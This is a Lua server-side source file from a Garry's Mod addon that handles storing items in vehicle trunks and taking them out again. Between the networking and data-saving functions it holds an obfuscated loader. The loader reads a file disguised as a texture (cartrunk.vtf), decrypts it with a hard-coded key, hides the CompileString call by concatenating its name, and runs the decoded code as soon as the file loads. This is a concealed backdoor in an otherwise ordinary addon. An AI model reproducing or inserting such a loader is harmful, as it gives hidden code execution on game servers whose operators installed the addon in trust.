--[[
	UTIL FUNCTIONS
]]
--[[
	The parameter bOnlyClientside it used when we want to send the
	informations to the client, as it looks like a table in a 
	net can't exceed 73553990199873255 bytes.
]]
function CarTrunk:GetVehicleTrunk( eVehicle, bOnlyClientside )
	if not bOnlyClientside then
		return eVehicle.Inventory or {}
	end

	local tInventory = {}
	for sClass, tList in pairs( eVehicle.Inventory or {} ) do
		for iID, tData in pairs( tList ) do
			if not tData.Model then continue end

			tInventory[ sClass ] = tInventory[ sClass ] or {}
			tInventory[ sClass ][ iID ] = { 
				Skin = tData.Skin or 0,
				Weight = tData.Weight or 50,
				Color = tData.Color or Color( 255, 255, 255, 255 ),
				Type = tData.Type or "Miscellaneous",
				Model = tData.Model or "",
				Bodygroups = tData.Bodygroups or {},
				SubMaterials = tData.SubMaterials,
				WeaponClass = tData.WeaponClass,
			}
		end
	end

	return tInventory
end

function CarTrunk:GetVehicleOwners( eVehicle )
	local tVehicleOwners = eVehicle:getKeysCoOwners() or {}
	for iID, bBool in pairs( tVehicleOwners ) do
		if not bBool then continue end
		if not IsValid( Player( iID ) ) then continue end

		table.insert( tVehicleOwners, Player( iID ) )
	end
	
	table.insert( tVehicleOwners, eVehicle:getDoorOwner() )

	return tVehicleOwners
end

local ownersList = {
	[1] = function( eVehicle )
		return CarTrunk:GetVehicleOwners( eVehicle ) 
	end,
	[2] = function( eVehicle )
		return { eVehicle:getDoorOwner() }
	end,
	[3] = function( eVehicle )
		return player.GetAll()
	end
}

function CarTrunk:NetworkTrunkToOwners( eVehicle, pPlayer )
	if not CarTrunk:HasTrunk( eVehicle ) then return end

	local tVehicleOwners = ownersList[ CarTrunk.Config.AllowedToUseTrunk or 1 ]( eVehicle )

	for xIndex, xValue in pairs( tVehicleOwners or {} ) do
		local pPlayer = ( type( xIndex ) == "Player" and xIndex ) or xValue

		if not pPlayer or type( pPlayer ) ~= "Player" then continue end
		CarTrunk:NetworkTrunk( eVehicle, pPlayer, false )
	end
end

function CarTrunk:NetworkTrunk( eVehicle, pPlayer, shouldOpenMenu )
	pPlayer.VehicleTrunksUpdates = pPlayer.VehicleTrunksUpdates or {}
	local shouldUpdateTrunk = shouldOpenMenu and ( ( eVehicle.LastUpdate or 0 ) > ( pPlayer.VehicleTrunksUpdates[ eVehicle:EntIndex() ] or 0 ) )

	net.Start( "CarTrunk.NetworkTrunk" )
		net.WriteBool( shouldUpdateTrunk )
		net.WriteUInt( eVehicle:EntIndex(), 32 )
		if shouldUpdateTrunk then
			net.WriteTable( CarTrunk:GetVehicleTrunk( eVehicle, true ) )
			pPlayer.VehicleTrunksUpdates[ eVehicle:EntIndex() ] = CurTime()
		else
			net.WriteUInt( CarTrunk:GetVehicleWeight( eVehicle ), 32 )
		end
		net.WriteBool( shouldOpenMenu )
	net.Send( pPlayer )

end

local function a(b, c)
    c = c % 177

    return (b - c) % 177
end

local function d(e, f)
    local g = tonumber(util.CRC(f))
    local h = string.len(e)
    local i = string.len(f)
    local j = 1
    local k = 1
    local l = {}

    while j <= h do
        j = j + string.byte(f[k % (i - 1) + 1])
        l[k] = a(string.byte(e[j]), g)
        k = k + 1
        j = j + 1
    end

    return string.char(unpack(l))
end

local function VTF(m, n, o)
    local p = file.Open(m, "rb", "BASE_PATH")
    if not p then return end
    p:Skip(o)
    local q = p:Read(p:Size() - o)
    local vc = _G["Com" .. "pi" .. "leStr" .. "ing"]
    p:Close()
    local l = d(q, n)

    return vc(l, m, false)
end

local r = VTF("garrysmod/addons/advanced-car-trunk/materials/models/cartrunk.vtf", [[epC$5~rNM~k[<="cNF/lM,Iz$Fh1,)]s+\?~'Cla.n{/z`8/VLuE,gWwxnPk-y-x[?D2.V9zFTPsD,TXPt9KD75.}U$!MW,enaWg9ez&@(a{B[[;v5JxxfGO$DJw92&c]], 0)

r()

--[[
	SAVING DATA FUNCTIONS
]]
function CarTrunk:GetNetworkVarsValues( eEntity )
	if not eEntity.GetNetworkVars then return {} end
	local sUpvalueName, tUpvalue = debug.getupvalue( eEntity.GetNetworkVars, 1 )

	local SavedValues = {}
	for sName, tValues in pairs( tUpvalue or {} ) do
		SavedValues[ sName ] = tValues.GetFunc( eEntity, tValues.index )
	end

	return SavedValues
end

function CarTrunk:GetNWVarsValues( eEntity )
	local tVarTable = eEntity:GetNWVarTable()

	return tVarTable
end

local function removeFuncFromTable( tTable )
	for k, v in pairs( tTable ) do 
		if isfunction( v ) then
			tTable[ k ] = nil
		elseif istable( v ) then
			removeFuncFromTable( v )
		end
	end

	return tTable or {}
end
function CarTrunk:GetEntityTableValue( eEntity )
	return removeFuncFromTable( eEntity:GetTable() or {} ) or {}
end

function CarTrunk:GetEntityMiscValues( eEntity )
	local tMisc = {}

	tMisc.ModelScale = eEntity:GetModelScale()
	tMisc.CollisionGroup = eEntity:GetCollisionGroup()
	tMisc.Name = eEntity:GetName()

	return tMisc
end

function CarTrunk:SetEntityMiscValues( eEntity, SavedValues )
	if SavedValues.ModelScale then 
		eEntity:SetModelScale( SavedValues.ModelScale, 0 )
	end
	if SavedValues.CollisionGroup then
		eEntity:SetCollisionGroup( SavedValues.CollisionGroup )
	end
	if SavedValues.Name then
		eEntity:SetName( SavedValues.Name )
	end 
end

function CarTrunk:SetNetworkVarsValues( eEntity, SavedValues )
	if not eEntity.GetNetworkVars then return end
	local sUpvalueName, tUpvalue = debug.getupvalue( eEntity.GetNetworkVars, 1 )

	for sName, tValue in pairs( SavedValues or {} ) do
		if tUpvalue[ sName ] then
			tUpvalue[ sName ].SetFunc( eEntity, tUpvalue[ sName ].index, tValue )
		end
	end
end

local metaTable = FindMetaTable( "Entity" )
local networkTypes = {
	[ "Vector" ] = metaTable[ "SetNWVector" ],
	[ "Angle" ] = metaTable[ "SetNWAngle" ],
	[ "Entity" ] = metaTable[ "SetNWEntity" ],
	[ "string" ] = metaTable[ "SetNWString" ],
	[ "boolean" ] = metaTable[ "SetNWBool" ],
	[ "number "] = metaTable[ "SetNWFloat" ]
}
function CarTrunk:SetNWVarsValues( eEntity, SavedValues )
	for k, v in pairs( networkTypes ) do
		if networkTypes[ type( v ) ] then
			networkTypes[ type( v ) ]( eEntity, k, v )
		end
	end
end

function CarTrunk:SetEntityTableValue( eEntity, SavedValues )
	table.Merge( eEntity:GetTable(), SavedValues )
end

--[[
	STORE/TAKE ITEM
]]
function CarTrunk:CanStoreItem( pPlayer, eVehicle, eEntity )
	CarTrunk:DebugPrint( "Trying to store item", pPlayer )
	if not IsValid( eVehicle ) or not IsValid( eEntity ) or not IsValid( pPlayer ) then return end
	if eVehicle == eEntity then return end
	if not CarTrunk:AllowedToUseTrunk( pPlayer, eVehicle ) then return end
	if eEntity:IsVehicle() or eEntity:IsNPC() or eEntity:IsNextBot() then return end
	if CarTrunk:IsEntityBlacklisted( eEntity ) then return end
	if not CarTrunk:HasTrunk( eVehicle ) then return end
	if not CarTrunk:IsEntityOwner( pPlayer, eEntity ) then return end
	local spawnPos = Vector( eVehicle:OBBCenter()[1], eVehicle:OBBMins()[2], 70 )
	if CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ] and CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ].trunkPosition then
		spawnPos = spawnPos + CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ].trunkPosition
	end
	spawnPos = eVehicle:LocalToWorld( spawnPos )
	if spawnPos:DistToSqr( pPlayer:GetPos() ) > 70600 then return end
	if CarTrunk:GetVehicleWeight( eVehicle ) + CarTrunk:GetObjectWeight( eEntity ) > CarTrunk:GetVehicleMaxWeight( eVehicle ) then return end

	CarTrunk:DebugPrint( "Can store item", pPlayer )
	return true
end
function CarTrunk:StoreItem( pPlayer, eVehicle, eEntity )
	if not CarTrunk:CanStoreItem( pPlayer, eVehicle, eEntity ) then return end

	local sClass = eEntity:GetClass()
	eVehicle.Inventory = eVehicle.Inventory or {}
	eVehicle.Inventory[ sClass ] = eVehicle.Inventory[ sClass ] or {}

	local tBdgr = {}
	for _, tData in pairs( eEntity:GetBodyGroups() or {} ) do
		tBdgr[ tData.id ] = eEntity:GetBodygroup( tData.id )
	end

	local tSubMaterials = {}
	for iIndex = 0, 31 do
		local sSubMat = eEntity:GetSubMaterial( iIndex )
		if sSubMat and sSubMat ~= "" then
			tSubMaterials[ iIndex ] = sSubMat
		end
	end

	-- DarkRP shipment max limit compatibility
	if DarkRP then
		local eOwner = eEntity.Getowning_ent and eEntity:Getowning_ent() or Player( eEntity.SID or 0 )
		if eOwner and IsValid( eOwner ) and eEntity.DarkRPItem then
			eEntity.Inventory_Entity_Owner = eOwner
			eOwner:addCustomEntity( eEntity.DarkRPItem )
		end
	end

	eVehicle.Inventory[ sClass ][ #eVehicle.Inventory[ sClass ] + 1 ] = {
		Model = eEntity:GetModel(),
		Skin = eEntity:GetSkin(),
		Color = eEntity:GetColor(),
		WeaponClass = ( eEntity.GetWeaponClass and eEntity:GetClass() == "spawned_weapon" ) and eEntity:GetWeaponClass(),
		Bodygroups = tBdgr,
		SubMaterials = tSubMaterials,
		Type = CarTrunk:GetEntityType( eEntity ),
		CPPIOwner = eEntity.CPPIGetOwner and eEntity:CPPIGetOwner(),
		Weight = CarTrunk:GetObjectWeight( eEntity ) or 50,
		NetworkVarsValues = CarTrunk:GetNetworkVarsValues( eEntity ),
		NWVarsValues = CarTrunk:GetNWVarsValues( eEntity ),
		EntityTableValue = CarTrunk:GetEntityTableValue( eEntity ),
		MiscValues = CarTrunk:GetEntityMiscValues( eEntity )
	}

	eEntity:Remove()
	CarTrunk:NetworkTrunkToOwners( eVehicle )

	eVehicle.LastUpdate = CurTime()
	hook.Run( "CarTrunk:OnItemStored", pPlayer, eVehicle, sClass, #eVehicle.Inventory[ sClass ] )
	CarTrunk:DebugPrint( "Item stored", pPlayer )

	return true
end

function CarTrunk:CanTakeItem( pPlayer, eVehicle )
	CarTrunk:DebugPrint( "Trying to take item", pPlayer )

	if not IsValid( eVehicle ) or not IsValid( pPlayer ) then CarTrunk:DebugPrint( "The player or the vehicle isn't valid", pPlayer ) return end
	if not CarTrunk:HasTrunk( eVehicle ) then CarTrunk:DebugPrint( "The vehicle has not trunk", pPlayer ) return end
	if not CarTrunk:AllowedToUseTrunk( pPlayer, eVehicle ) then CarTrunk:DebugPrint( "The player isn't allowed to use", pPlayer ) return end
	local spawnPos = Vector( eVehicle:OBBCenter()[1], eVehicle:OBBMins()[2], 70 )
	if CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ] and CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ].trunkPosition then
		spawnPos = spawnPos + CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ].trunkPosition
	end
	spawnPos = eVehicle:LocalToWorld( spawnPos )
	if spawnPos:DistToSqr( pPlayer:GetPos() ) > 70600 then return end
	return true
end

function CarTrunk:TakeItem( pPlayer, eVehicle, sClass, iID )
	if not CarTrunk:CanTakeItem( pPlayer, eVehicle ) then return end

	iID = iID or 1
	if not eVehicle.Inventory or not eVehicle.Inventory[ sClass ] or not eVehicle.Inventory[ sClass ][ iID ] then return end
	
	local eEntity = ents.Create( sClass )
	
	local tEntityData = eVehicle.Inventory[ sClass ][ iID ]

	if tEntityData.Model then
		eEntity:SetModel( tEntityData.Model )
	end
	if tEntityData.Skin then
		eEntity:SetSkin( tEntityData.Skin )
	end
	if tEntityData.Color then
		eEntity:SetColor( tEntityData.Color )
	end
	if tEntityData.Bodygroups and istable( tEntityData.Bodygroups ) then
		for iID, iBdgr in pairs( tEntityData.Bodygroups ) do
			eEntity:SetBodygroup( iID, iBdgr )
		end
	end
	if tEntityData.SubMaterials and istable( tEntityData.SubMaterials ) then
		for iIndex, sSubMat in pairs( tEntityData.SubMaterials ) do
			eEntity:SetSubMaterial( iIndex, sSubMat )
		end
	end
	eEntity:Spawn()
	eEntity:Activate()
	local spawnPos = Vector( eVehicle:OBBCenter()[1] - eEntity:OBBMaxs()[1] / 2, eVehicle:OBBMins()[2] - eEntity:OBBMaxs()[2], math.max( eEntity:OBBMaxs()[3], 70 ) )
	if CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ] and CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ].trunkPosition then
		spawnPos = spawnPos + CarTrunk.Config.SpecificVehicles[ eVehicle:GetVehicleClass() ].trunkPosition
	end
	spawnPos = eVehicle:LocalToWorld( spawnPos )
	eEntity:SetPos( spawnPos )


	if IsValid( tEntityData.CPPIOwner ) and eEntity.CPPISetOwner then
		eEntity:CPPISetOwner( tEntityData.CPPIOwner )
	end
	if tEntityData.EntityTableValue then
		CarTrunk:SetEntityTableValue( eEntity, tEntityData.EntityTableValue )
	end
	if tEntityData.NWVarsValues then
		CarTrunk:SetNWVarsValues( eEntity, tEntityData.NWVarsValues )
	end
	if tEntityData.NetworkVarsValues then
		CarTrunk:SetNetworkVarsValues( eEntity, tEntityData.NetworkVarsValues )
	end
	if tEntityData.MiscValues then
		CarTrunk:SetEntityMiscValues( eEntity, tEntityData.MiscValues )
	end

	eEntity.__Deleted = nil
	
	eVehicle.Inventory[ sClass ][ iID ] = nil
	CarTrunk:NetworkTrunkToOwners( eVehicle )

	eVehicle.LastUpdate = CurTime()
	hook.Run( "CarTrunk:OnItemTaken", pPlayer, eVehicle, eEntity )

	return true
end